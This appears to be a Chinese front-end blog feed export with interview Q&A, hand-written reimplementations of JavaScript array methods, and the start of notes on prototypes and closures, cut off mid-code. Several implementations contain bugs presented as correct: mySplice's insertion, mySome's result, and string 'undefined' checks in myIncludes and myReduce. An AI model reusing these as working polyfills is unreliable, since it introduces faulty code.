为什么循环产生的组件中要利用上key这个特殊的prop？Keys负责帮助React跟踪列表中哪些元素被改变/添加/移除。React利用子元素的key在比较两棵树的时候，快速得知一个元素是新的还是刚刚被移除。没有keys，React也就不知道当前哪一个的item被移除了。 React-router 路由的实现原理？说说React Native,Weex框架的实现原理？受控组件(Controlled Component)与非受控组件(Uncontrolled Component)的区别refs 是什么?Refs是能访问DOM元素或组件实例的一个函数； React为什么自己定义一套事件体系呢，与浏览器原生事件体系有什么关系？什么时候应该选择用class实现一个组件，什么时候用一个函数实现一个组件？组件用到了state或者用了生命周期函数，那么就该使用Class component。其他情况下，应使用Functional component。 什么是HoC（Higher-Order Component）？适用于什么场景？高阶组件就是一个 React 组件包裹着另外一个 React 组件并不是父子关系的组件，如何实现相互的数据通信？ 使用父组件，通过props将变量传入子组件 （如通过refs，父组件获取一个子组件的方法，简单包装后，将包装后的方法通过props传入另一个子组件） 用过 React 技术栈中哪些数据流管理库？Redux\Dva Redux是如何做到可预测呢？Redux将React组件划分为哪两种？Redux是如何将state注入到React组件上的？请描述一次完整的 Redux 数据流React的批量更新机制 BatchUpdates？React与Vue，各自的组件更新进行对比，它们有哪些区别？你遇到过比较难的技术问题是？你是如何解决的？设计模式 知道什么是singleton, factory, strategy, decrator么?常使用的库有哪些？常用的前端开发工具？开发过什么应用或组件？页面重构怎么操作？ 网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。 也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。 对于传统的网站来说重构通常是： 表格(table)布局改为DIV+CSS 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的) 对于移动平台的优化 针对于SEO进行优化 深层次的网站重构应该考虑的方面 减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 压缩JS、CSS、image等前端资源(通常是由服务器来解决)程序的性能优化(如数据读写) 采用CDN来加速资源加载 对于JS DOM的优化 HTTP服务器的文件缓存 列举IE与其他浏览器不一样的特性？1、事件不同之处： 触发事件的元素被认为是目标（target）。而在 IE 中，目标包含在 event 对象的 srcElement 属性； 获取字符代码、如果按键代表一个字符（shift、ctrl、alt除外），IE 的 keyCode 会返回字符代码（Unicode），DOM 中按键的代码和字符是分离的，要获取字符代码，需要使用 charCode 属性； 阻止某个事件的默认行为，IE 中阻止某个事件的默认行为，必须将 returnValue 属性设置为 false，Mozilla 中，需要调用 preventDefault() 方法； 停止事件冒泡，IE 中阻止事件进一步冒泡，需要设置 cancelBubble 为 true，Mozzilla 中，需要调用 stopPropagation()； 99%的网站都需要被重构是那本书上写的？ 网站重构：应用web标准进行设计（第2版） WEB应用从服务器主动推送Data到客户端有那些方式？ html5提供的Websocket 不可见的iframe WebSocket通过Flash XHR长时间连接 XHR Multipart Streaming 对Node的优点和缺点提出了自己的看法？（优点）因为Node是基于事件驱动和无阻塞的，所以非常适合处理并发请求，因此构建在Node上的代理服务器相比其他技术实现（如Ruby）的服务器表现要好得多。 此外，与Node代理服务器交互的客户端代码是由javascript语言编写的， 因此客户端和服务器端都用同一种语言编写，这是非常美妙的事情。 （缺点）Node是一个相对新的开源项目，所以不太稳定，它总是一直在变，而且缺少足够多的第三方库支持。看起来，就像是Ruby/Rails当年的样子。 http状态码有那些？分别代表是什么意思？简单版[ 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 ] 详细版： 1、浏览器会开启一个线程来处理这个请求，对 URL 分析判断如果是 http 协议就按照 Web 方式来处理; 2、调用浏览器内核中的对应方法，比如 WebView 中的 loadUrl 方法; 3、通过DNS解析获取网址的IP地址，设置 UA 等信息发出第二个GET请求; 4、进行HTTP协议会话，客户端发送报头(请求报头); 5、进入到web服务器上的 Web Server，如 Apache、Tomcat、Node.JS 等服务器; 6、进入部署好的后端应用，如 PHP、Java、JavaScript、Python 等，找到对应的请求处理; 7、处理结束回馈报头，此处如果浏览器访问过，缓存上有对应资源，会与服务器最后修改时间对比，一致则返回304; 8、浏览器开始下载html文档(响应报头，状态码200)，同时使用缓存; 9、文档树建立，根据标记请求所需指定MIME类型的文件（比如css、js）,同时设置了cookie; 10、页面开始渲染DOM，JS根据DOM API操作DOM,执行事件绑定等，页面显示完成。 简洁版： 浏览器根据请求的URL交给DNS域名解析，找到真实IP，向服务器发起请求； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。 部分地区用户反应网站很卡，请问有哪些可能性的原因，以及解决方法？ 从打开app到刷新出内容，整个过程中都发生了什么，如果感觉慢，怎么定位问题，怎么解决?第一次访问页面中时弹出引导，用户关闭引导，之后再次进入页面时不希望出现引导，如何实现？localStorage 除了前端以外还了解什么其它技术么？你最最厉害的技能是什么？你用的得心应手用的熟练地编辑器&amp;开发环境是什么样子？ Sublime Text 3 + 插件 Google chrome 查看页面UI、动画效果和交互功能，Firebug 兼容测试和 Node.js + webpack Git 版本控制和Code Review 对前端工程师这个职位是怎么样理解的？它的前景会怎么样？ 前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。 1、实现界面交互 2、提升用户体验 3、有了Node.js，前端可以实现服务端的一些事情 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好， 参与项目，快速高质量完成实现效果图，精确到1px； 与团队成员，UI设计，产品经理的沟通； 做好的页面结构，页面重构和用户体验； 处理hack，兼容、写出优美的代码格式； 针对服务器的优化、拥抱最新前端技术。 你怎么看待Web App 、hybrid App、Native App？你移动端前端开发的理解？（和 Web 前端开发的主要区别是什么？）产品进行版本升级时，可能发生不兼容性问题，如何提前预防和解决？ 非覆盖式发布，API新增而不是在原来的上面修改； 提前做好 @Deprecated的版本提示； 你对加班的看法？ 加班就像借钱，原则应当是——救急不救穷 平时如何管理你的项目？ 先期团队必须确定好全局样式（global.css），编码模式(utf-8) 等； 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）； 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）； 页面进行标注（例如 页面 模块 开始和结束）； CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）； JS 分文件夹存放 命名以该JS功能为准的英文翻译。 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理 如何设计突发大规模并发架构？当团队人手不足，把功能代码写完已经需要加班的情况下，你会做前端代码的测试吗？说说最近最流行的一些东西吧？常去哪些网站？ES6\WebAssembly\Node\MVVM\Web Components\React\React Native\Webpack 组件化 知道什么是SEO并且怎么优化么? 知道各种meta data的含义么?移动端（Android IOS）怎么做好用户体验? 清晰的视觉纵线、 信息的分组、极致的减法、 利用选择代替输入、 标签及文字的排布方式、 依靠明文确认密码、 合理的键盘利用、 简单描述一下你做过的移动APP项目研发流程？你在现在的团队处于什么样的角色，起到了什么明显的作用？你认为怎样才是全端工程师（Full Stack developer）？介绍一个你最得意的作品吧？你有自己的技术博客吗，用了哪些技术？对前端安全有什么看法？是否了解Web注入攻击，说下原理，最常见的两种攻击（XSS 和 CSRF）了解到什么程度？项目中遇到国哪些印象深刻的技术难题，具体是什么问题，怎么解决？。最近在学什么东西？你的优点是什么？缺点是什么？如何管理前端团队?最近在学什么？能谈谈你未来3，5年给自己的规划吗？前端学习网站推荐 极客标签： http://www.gbtags.com/ 码农周刊： http://weekly.manong.io/issues/ 前端周刊： http://www.feweekly.com/issues 慕课网： http://www.imooc.com/ div.io： http://div.io Hacker News： https://news.ycombinator.com/news InfoQ： http://www.infoq.com/ w3cplus： http://www.w3cplus.com/ Stack Overflow： http://stackoverflow.com/ 10.w3school： http://www.w3school.com.cn/ 11.mozilla： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript文档推荐jQuery 基本原理 JavaScript 秘密花园 CSS参考手册 JavaScript 标准参考教程 ECMAScript 6入门]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>JavaScript专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数组常见方法的使用及其封装]]></title>
    <url>%2F2018%2F08%2F26%2F%E6%95%B0%E7%BB%84%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%B6%E5%B0%81%E8%A3%85%2F</url>
    <content type="text"><![CDATA[push 向数组末尾新增一项； 参数是新增的那一项;可以传多个； 新数组的数组成员的个数； 原有数组发生改变； 123456Array.prototype.myPush = function () &#123; for (var i = 0; i &lt; arguments.length; i++) &#123; this[this.length] = arguments[i]; &#125; return this.length;&#125;; pop 删除数组的最后一项 不需要传参数 被删除的那一项 原有数组发生改变 12345Array.prototype.myPop = function () &#123; var last = this[this.length - 1]; this.length -= 1; return last;&#125;; unshift 向数组开头新增一项； 需要传参数 新数组的数组成员个数 原有数组发生改变； 123456789101112131415Array.prototype.myUnShift = function () &#123; var len = this.length+arguments.length; var aLen = arguments.length; var tLen = this.length; for(var i = len-1;i&gt;=0;i--)&#123; if(i&gt;=aLen)&#123; this[i] = this[tLen-1]; tLen--; &#125;else&#123; this[aLen-1] = arguments[i]; aLen--; &#125; &#125; return this.length;&#125;; shift 删除数组的第一项 不需要传参 被删除的那一项 原有数组的发生改变； 12345678Array.prototype.myShift = function () &#123; var first = this[0]; for(var i = 0;i&lt;this.length-1;i++)&#123; this[i] = this[i+1]; &#125; this.length--; return first;&#125;; slice 数组的截取 slice(m,n): 从数组索引m开始，截取到索引n，但是不包含n;[前包后不包] slice(m) : 从索引m开始，截取到末尾； slice():数组的克隆 slice(0); 索引负数： 让当前length+负数； 返回值是截取的数组 原有数组不发生改变； 分析： 1234567891011121314151617首先：先分清楚slice有几种情况，slice的思想传的参数可以是其他类型的数据，只要能转成有效数字就可以(所以参数的类型要求比较灵活)其次，要注意的是只有第一个和第二个参数为有效参数，第三个及第三个以后的参数将对截取的结果不产生影响对参数的处理：我们暂且把第一个参数给变量start,第二个参数给变量end1.当参数1、参数2同时为undefined或者其中一个为undefined的情况下情况1：参数1为undefined时，直接取start=0情况2：参数2为undefined时，直接取end=this.length2.当参数1和参数2都不是undefined的情况下情况1：当第一个参数为负数的情况下：start取this.length与参数中的最大值;当第一个参数大于等于0的情况下,start直接取自己情况2：当第二个参数为负数的情况下，end取this.length与end的和;当参数大于0,end取this.length与end中的最小值对区间长度的处理：设置size=end-start情况1：当区间长度小于等于0的情况下，直接返回空数组情况2：当区间长度大于0的情况下，不管对于字符串还是数组，创建一个长度为size的数组，依次从start到end，赋值给新的数组，将新数组返回 1234567891011121314151617181920212223Array.prototype.mySlice = function (start,end) &#123; var newAry = [];//创建一个变量用来接收返回值 var len = this.length;//变量接收当前数组的长度 //先对参数为undefined的情况进行处理 start = (start !== undefined)?start:0; end = (end !== undefined)?end:len; //对于参数的处理，采用三目运算符,由于在与0判断的时候自动转换为数字再进行判断，所以直接与0比较即可 start = (start&gt;=0)?start:Math.max(0,len+start); end = (end&gt;=0)?Math.min(end,len):len+end; var size = end - start;//用一个变量接收截取区间的长度 if(size&gt;0)&#123; //当区间长度大于0时，实例化一个长度为size的数组，并赋值给newAry newAry = new Array(size); //遍历数组，将当前数组[start,end)区间上的值依次赋值给newAry for(var i = 0;i&lt;size;i++)&#123; newAry[i] = this[i+start]; &#125; &#125;else&#123; //当区间长度小于等于0的情况下，直接返回空数组 return newAry; &#125; return newAry; &#125;; splice 删除数组中的某几项 splice(m,n): 从索引开始，删除n个 splice(m) : 从索引m开始删除到末尾； splice(0): splice(m,x,n);替换从索引m开始，删除x个，用n替换； 返回值；删除那几项，并且以数组返回 原有数组发生改变； 分析 123456789101112131415161718192021222324252627splice原理：参数的三个含义：开始修改的位置、删除的项数、添加进来的项参数的情况：暂且把第一个参数设置为start、删除的项数为delNum情况1：如果第一个参数为undefined或者则默认start从零开始，如果第一个参数为负数，则start=第一个参数加数组长度情况2：如果删除的项数超过了剩余的项数，则只删除剩余的项数情况3：第三个参数及以后，都是先删除了之后再把剩余的参数从start的位置开始添加进来splice实现的三个功能：1、添加：2、删除3、替换：当删除0项的时候为替换返回值：返回值是返回被删除的那几项，并以数组的形式返回实现方法：参数1和参数2，实现了删除，并且将删除的项存储到一个数组中返回1、先创建一个空数组将要删除的项存储起来，2、用两层循环(外层循环的次数是删除的项数)，内层循环是从start位置开始遍历this，每次循环都将后面一项赋值给前一项，内层循环结束之后，删除最后一项参数3及后面的参数实现插入功能1、同样创建一个空数组，从start位置开始先把this后面的项存储起来2、将arguments第三项以后的值依次插入this中，3、插入完成之后，再把刚才空数组中的项依次插入this的末尾 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647Array.prototype.mySplice = function (start,delNum) &#123; //先判断start是否为undefined，如果为undefined默认赋值为0，如果不是undefined，则取本身的值 start = (start === undefined)?0:start; //再判断start是否为负数，如果为负数，则返回当前值与数组长度的和 start = (start&lt;0)?(start+this.length):start; //变量接收剩余的长度 var len = this.length - start; //如果第二项没有传值的情况下，默认删除剩余的所有项,再判断delNum要删除的项数是否大于剩余的项数,如果大于则取当前数组剩余的项，如果条件不成立，取当前值 delNum = (delNum&gt;len||delNum===undefined)?len:delNum; //再判断有没有第三项及以后的项，即arguments的长度是否大于等于3 //创建一个空地址，用于接收被删除的项 var newAry = []; //当delNum&gt;0时，删除delNum项；当delNum&lt;=0时不删除 if(delNum&gt;0)&#123; for(var i = start;i&lt;delNum+start;i++)&#123; newAry[i-start] = this[i]; &#125; for(var j = 0;j&lt;delNum;j++)&#123; for(var k = start;k&lt;this.length-1;k++)&#123; this[k] = this[k+1]; &#125; this.length--; &#125; &#125;else &#123; newAry = []; //delNum&lt;=0时，不删除，返回空数组 &#125; //当arguments.length&lt;=2时，不需要添加数组,直接删除即可 //当arguments.length&gt;2时，即有第三个参数，全部插入当前数组中,在start索引的前一项开始插入 if(arguments.length&gt;2)&#123; //创建一个新数组先把从start到最后面的值，目的是先把值存储起来，等arguments中的值全部插入之后，再将ary1依次插入 var ary1 = []; for(var p = start;p&lt;this.length;p++)&#123; ary1[p-start] = this[start]; &#125; for(var m = 2;m&lt;arguments.length;m++)&#123; //将arguments的剩余项从start开始依次添加进this中 this[start++] = arguments[m]; &#125; for(var q = 0;q&lt;ary1.length;q++)&#123; this[start++] = ary1[q]; &#125; &#125; return newAry; &#125;; sort 数组排序 参数 sort() : 只能数组成员是相同位数的数组 sort(function(a,b){return a-b}) 从小到大排序 sort(function(a,b){return b-a})从大到小 是排序之后的数组 原有数组发生改变； 12345678910111213141516171819202122232425sort方法实现过程比较复杂：功能如下情况1：无参实现对字符串数组的排序情况2：无参实现对number类型的数组进行排序情况3：无参实现对字符串、number等混合类型的数组的排序情况4：带参实现对number类型的数值数据排序情况5：带参sort()对简单对象List的自定义属性排序情况6：带参实现对字符串、number混合类型的数组的排序核心原理：不带参（以及带的参数不是函数）的情况下:默认升序排列不带参的情况下，直接转字符串，逐个比较ASCII码的值只要有一个是对象&#123;&#125;就不交换带参数为函数的情况下：根据函数的返回值进行比较；如果函数返回值大于0；则交换位置参数的情况情况1：如果参数不是函数，则不影响原来排序过程情况2：如果参数是函数，则根据回调函数中的返回值进行排序。如果返回值大于0，则交换位置；如果返回值小于0，则不交换位置如果返回值不是一个数字，则不交换位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586Array.prototype.mySort = function(fn)&#123; if(Object.prototype.toString.call(fn)==='[object Function]')&#123; //如果传进来参数的是函数 for(var i = 0;i&lt;this.length-1;i++)&#123; //遍历数组,将前后两项作为实参传给fn if(fn.call(this,this[i],this[i+1])&gt;0)&#123; //如果fn执行之后的返回值大于0.就调用swap方法交换位置 var a = this[i],b=this[i+1]; this[i] = swap(a,b).a; this[i+1] = swap(a,b).b; //交换之后，如果当前项不是第一项，则当前项(索引为i的项)继续跟前面的项进行比较 if(i&gt;0)&#123; for(var j = i-1;j&gt;=0;j--)&#123; if(fn.call(this,this[j],this[j+1])&gt;0)&#123; var a = this[j],b=this[j+1]; this[j] = swap(a,b).a; this[j+1] = swap(a,b).b; &#125; &#125; &#125; &#125; &#125; &#125;else&#123; //如果不是函数，则按正常排序 //遍历数组，将前后两项进行比较 for(var i = 0;i&lt;this.length-1;i++)&#123; var cur = this[i];//当前项 var next = this[i+1];//下一项 if(comASCII(cur,next))&#123; //当返回true的时候交换，并且交换完成之后，当前项继续往前比较 this[i] = swap(cur,next).a; this[i+1] = swap(cur,next).b; //当前项继续向前比较 if(i&gt;0)&#123; for(var k = i-1;k&gt;=0;k--)&#123; var cur = this[k]; var next = this[k+1]; if(comASCII(cur,next))&#123; this[k] = swap(cur,next).a; this[k+1] = swap(cur,next).b; &#125; &#125; &#125; &#125; &#125; &#125; //封装一个交换位置的函数 function swap(a,b)&#123; return &#123; a:b, b:a &#125; &#125; //如果不传参的情况下比较ASCII码 function comASCII(cur,next)&#123; //全部转换为字符串、逐项比较ASCII码 cur = cur.toString(); next = next.toString(); //取长度最大值 var len = cur.length&gt;next.length?next.length:cur.length; //当前后两项都不是不是&#123;&#125;类型的数据时，进行比较 if(cur!=='[object Object]'&amp;&amp;next!=='[object Object]')&#123; for(var j = 0;j&lt;len;j++)&#123; if(!isNaN(cur.charCodeAt(j))&amp;&amp;!isNaN(next.charCodeAt(j)))&#123; //如果二者的ASCII码都是有效数字 if(cur.charCodeAt(j)&gt;next.charCodeAt(j))&#123; //如果前一项比后一项当前的ASCII码大，则返回true，交换位置 return true; &#125;else if(cur.charCodeAt(j)==next.charCodeAt(j))&#123; continue; &#125;else&#123; return false; &#125; &#125; &#125; if(!isNaN(cur.charCodeAt(len))&amp;&amp;isNaN(next.charCodeAt(len))&amp;&amp;(cur.charCodeAt(len-1)==next.charCodeAt(len-1)))&#123; //比较完之后，如果前一项ASCII还是有效数字，说明前项比后项大，交换 return true; &#125; &#125; //如果上述条件不满足，则不交换 return false; &#125; //返回当前数组 return this; &#125;; reverse 将数组颠倒过来 不需要传参数 数组成员顺序倒过来之后的数组 原有数组发生改变； 1234567891011121314Array.prototype.myReverse = function () &#123; //实例化一个长度为this.length的数组， var len = this.length; var newAry = new Array(len); for(var i = 0;i&lt;len;i++)&#123; //this数组依次从后开始赋值给新数组newAry newAry[i] = this[len-1-i]; &#125; //将newAry数组的值从前往后依次赋值给this for(var j = 0;j&lt;len;j++)&#123; this[j] = newAry[j]; &#125; return newAry; &#125;; concat 数组的拼接 不传参数： 数组的克隆 传参数，（数组、每一项）；把传入的实参拼接新的数组中； 拼接之后的新数组 原有数组不发生改变； 12345678910111213141516171819202122232425262728Array.prototype.myConcat = function (...arg) &#123; //创建一个数组，接收this的值和传进来的参数 /** * 分为传参和不传参两种情况 * 传参又分为传入的是数字，还是数组 * 不传参直接返回当前实例this */ var newAry = []; //先遍历this，把this中的值赋值给newAry for(var i = 0;i&lt;this.length;i++)&#123; newAry[i] = this[i]; &#125; //遍历实参判断实参是否是数组，如果是数组则遍历添加进去，如果不是数组，直接添加 for(var j = 0;j&lt;arg.length;j++)&#123; var cur = arg[j];//存储当前值 if(Object.prototype.toString.call(cur)==='[object Array]')&#123; //如果是数组,遍历该数组，添加进去 for(var k = 0;k&lt;cur.length;k++)&#123; newAry[newAry.length] = cur[k]; &#125; &#125;else&#123; //如果不是数组，则直接添加 newAry[newAry.length] = cur; &#125; &#125; //返回拼接之后的数组 return newAry; &#125; join 把数组成员按照特定的字符连接成一个字符串； 不传参数,会默认按照逗号分开 传参数，(特定的字符) 拼接之后的字符串 原有数组不发生改变 1234567891011121314151617Array.prototype.myJoin = function(n)&#123; //对形参n的处理，如果是undefined就默认的逗号拼接，如果传参了就按参数拼接 n = (n===undefined)?',': n.toString(); //遍历数组 var str = '';//声明一个空字符串 for(var i = 0;i&lt;this.length;i++)&#123; //存储当前项 var cur = this[i]; //如果不是最后一项就拼接上n，如果是最后一项就直接拼上当前项的值 if(i !== this.length-1)&#123; str+=cur+n; &#125;else&#123; str+=cur; &#125; &#125; return str; &#125;; indexOf 检测数组成员在数组中第一次出现的索引位置； 判断当前项是否在数组中存在；如果不存在，返回-1； 需要参数 返回在数组中第一次出现的索引； 原有数组不发生改变 1234567891011121314151617181920Array.prototype.myIndexOf = function(n)&#123; /** * 功能：查找当前项在数组中第一次出现的索引，查找成功返回当前索引，失败返回-1 * 返回-1 的情况： * n是undefined。即不传参 * n找不到 */ if(n)&#123; for(var i = 0;i&lt;this.length;i++)&#123; var cur = this[i]; if(cur===n) &#123; return i;//直接返回当前索引值 &#125; &#125; //如果遍历完数组还是找不到，返回-1； return -1; &#125; //如果n是undefined，返回-1 return -1; &#125;; lastIndexOf 检测数组成员在数组中最后一次出现的索引位置； 判断当前项是否在数组中存在；如果不存在，返回-1； 需要参数 返回在数组中最后一次出现的索引； 原有数组不发生改变； 1234567891011121314151617181920Array.prototype.myLastIndexOf = function(n)&#123; /** * 功能：查找当前项在数组中最后一次出现的索引，查找成功返回当前索引，失败返回-1 * 返回-1 的情况： * n是undefined。即不传参 * n找不到 */ if(n)&#123; for(var i = this.length-1;i&gt;=0;i--)&#123; var cur = this[i]; if(cur===n) &#123; return i;//直接返回当前索引值 &#125; &#125; //如果遍历完数组还是找不到，返回-1； return -1; &#125; //如果n是undefined，返回-1 return -1; &#125;; map 遍历数组和映射 需要参数 映射之后的数组 原有数组不发生改变 1234567891011121314151617181920Array.prototype.myMap = function(fn,c)&#123; /** * map遍历数组，传参有两个，第一个是回调函数，第二个参数可以改变回调函数中的this， * 当第二个参数不传的时候，回调函数中的this非严格模式下指向undefined * 回调函数中的第一个参数是当前项，第二个参数是当前项的索引， * 有多少项回调函数就执行多少次，回调函数有返回值, 并存在一个数组中，当成map返回值返回 */ var newAry = []; if(Object.prototype.toString.call(fn)==='[object Function]')&#123; //如果是一个函数，执行下面的的循环语句 for(var i = 0;i&lt;this.length;i++)&#123; newAry[i] = fn.call(c,this[i],i); &#125; &#125;else&#123; //如果不是函数，手动抛出异常 throw new Error(fn+' is not a function'); &#125; return newAry; /*return newAry;*/ &#125;; forEach 遍历数组;没有返回值； 需要参数 返回值是undefined 原有数组不发生改变 123456789101112131415161718Array.prototype.myForEach = function(fn,c)&#123; /** * forEach遍历数组，传参有两个，第一个是回调函数，第二个参数可以改变回调函数中的this， * 当第二个参数不传的时候，回调函数中的this非严格模式下指向undefined * 回调函数中的第一个参数是当前项，第二个参数是当前项的索引， * 有多少项回调函数就执行多少次， * forEach没有返回值，返回值默认是undefined */ //如果fn不是一个函数，则抛出异常 if(Object.prototype.toString.call(fn)==='[object Function]')&#123; for(var i = 0;i&lt;this.length;i++)&#123; fn.call(c,this[i],i); &#125; &#125;else&#123; //如果不是函数，手动抛出异常 throw new Error(fn+' is not a function'); &#125; &#125;; toString 转字符串 不需要参数 返回一个去了中括号之后的字符串 原有数组不变 12345678910111213Array.prototype.myToString = function()&#123; //用一个空字符串去拼接数组,每一项（除了最后一项）拼上一个逗号， var str = ''; for(var i = 0;i&lt;this.length;i++)&#123; var cur = this[i]; if(i !== this.length-1)&#123; str +=cur+','; &#125;else&#123; str+=cur; &#125; &#125; return str; &#125;; filter过滤;把符合条件的放进新数组中；原有数组不发生改变 12345678910111213141516Array.prototype.myFilter = function(fn) &#123; var ary = []; var result; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; try &#123; result = fn.call(null, cur, i, this); &#125; catch (e) &#123; throw new Error(fn + ' is not a function'); &#125; if (result) &#123; ary.push(cur); &#125; &#125; return ary;&#125; find查找；从所到右一次进行查找；找到符合条件的第一项，并且把这一项返回；结束整个函数 123456789101112131415Array.prototype.myFind = function(fn) &#123; var result; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; try &#123; result = fn.call(null, cur, i, this) ? true : undefined; &#125; catch (e) &#123; throw new Error(fn + ' is not a function'); &#125; if (result) &#123; return cur; &#125; &#125; return result;&#125; some返回一个布尔值；如果有符合条件的返回true，如果没有找到符合条件的，返回是false 123456789101112Array.prototype.mySome = function(fn) &#123; var result; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; try &#123; result = fn.call(null, cur, i, this) ? true : false; &#125; catch (e) &#123; throw new Error(fn + ' is not a function'); &#125; &#125; return result;&#125; every返回一个布尔值；true或false；必须要求每一项都返回true，整体结果返回true；只要有一个是false，整体结果就是false 123456789101112131415Array.prototype.myEvery = function(fn) &#123; var result; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; try &#123; result = fn(cur, i, this); &#125; catch (e) &#123; throw new Error(fn + ' is not a function'); &#125; if (!result) &#123; return result; &#125; &#125; return result;&#125; includes包含；检测是否包含某一项；如果包含返回true，不包含返回false； 12345678910111213Array.prototype.myIncludes = function(num) &#123; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; if (num != "undefined") &#123; if (cur === num) &#123; return true; &#125; &#125; else &#123; return false; &#125; &#125; return false;&#125; reduce收敛；求和 123456789101112131415161718192021Array.prototype.myReduce = function(fn, param) &#123; var prev; for (var i = 0; i &lt; this.length; i++) &#123; var cur = this[i]; if (i == 0) &#123; if (param !== "undefined") &#123; prev = param; &#125; else &#123; prev = cur; continue; &#125; &#125; try &#123; prev = fn.call(null, prev, cur, i, this); &#125; catch (e) &#123; throw new Error(fn + ' is not a function'); &#125; &#125; return prev;&#125;]]></content>
      <categories>
        <category>数组</category>
      </categories>
      <tags>
        <tag>数组方法</tag>
        <tag>封装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端经典面试题]]></title>
    <url>%2F2018%2F08%2F21%2F%E5%89%8D%E7%AB%AF%E7%BB%8F%E5%85%B8%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[JavaScript原型我们创建的每一个函数，都可以有一个prototype属性，该属性指向一个对象。这个对象，就是原型。 当我们在创建对象时，可以根据自己的需求，选择性的将一些属性和方法通过prototype属性，挂载在原型对象上。而每一个new出来的实例，都有一个proto属性，该属性指向构造函数的原型对象，通过这个属性，让实例对象也能够访问原型对象上的方法。因此，当所有的实例都能够通过proto访问到原型对象时，原型对象的方法与属性就变成了共有方法与属性。// 声明构造函数 123function Person(name, age) &#123; this.name = name; this.age = age; &#125; // 通过prototye属性，将方法挂载到原型对象上 123456Person.prototype.getName = function() &#123; return this.name; &#125;var p1 = new Person('tim', 10); var p2 = new Person('jak', 22);console.log(p1.getName === p2.getName); // true 通过图示我们可以看出，构造函数的prototype与所有实例对象的proto都指向原型对象。而原型对象的constructor指向构造函数。 原型链我们知道所有的函数都有一个叫做toString的方法。那么这个方法到底是在哪里的呢？ 先随意声明一个函数： 1function foo() &#123;&#125; 其中foo是Function对象的实例。而Function的原型对象同时又是Object的实例。这样就构成了一条原型链。原型链的访问，其实跟作用域链有很大的相似之处，他们都是一次单向的查找过程。因此实例对象能够通过原型链，访问到处于原型链上对象的所有属性与方法。这也是foo最终能够访问到处于Object原型对象上的toString方法的原因。 作用域链作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的。 闭包第一种理解(红宝书)是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量。 第二种理解(你不知道的JavaScript)当函数可以记住并访问所在的词法作用域时，就产生了闭包，这个函数持有对该词法作用域的引用，这个引用就叫做闭包。 闭包的本质闭包本质还是函数，只不过这个函数绑定了上下文环境（函数内部引用的所有变量）。 闭包的缺点常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。 闭包的作用(使用场景)可以用来管理私有变量和私有方法，将对变量（状态）的变化封装在安全的环境中，使得这些变量不能被外部随意修改，同时又可以通过指定的函数接口来操作。 闭包有三个特性 函数嵌套函数 函数内部可以引用外部的参数和变量 参数和变量不会被垃圾回收机制回收作用域JavaScript的作用域就是词法作用域而不是动态作用域； 词法作用域最重要的特征是它的定义过程发生在代码的书写阶段； 动态作用域的作用域链是基于调用栈的 词法作用域的作用域链是基于代码中的作用域嵌套。thisJavaScript的this总是指向一个对象，而具体指向哪个对象是在运行时基于函数的执行环境动态绑定的，而非函数被声明时的环境。this指向作为普通函数调用（this指向全局对象window对象） 作为对象的方法调用（this指向该对象） 构造器调用（this指向用new返回的这个对象） call、apply、bind的调用（this指向第一个参数对象）高阶函数函数作为参数传递 函数作为返回值输出new操作符具体干了什么呢?创建一个新对象； 将构造函数的作用域赋给新对象（因此this就指向了这个新对象）； 执行构造函数中的代码（为这个新对象添加属性） 返回新对象继承简单原型链继承 123456function Super()&#123; this.name = 'hzzly'; &#125; function Sub()&#123; &#125; // ... Sub.prototype = new Super(); Sub.prototype = new Super();//核心 缺点： 修改sub1.name后sub2.name也变了，因为来自原型对象的引用属性是所有实例共享的。 构造函数式继承：123456789function Super(val)&#123; this.val = val; this.fun = function()&#123; // 实例函数 // ... &#125; &#125;function 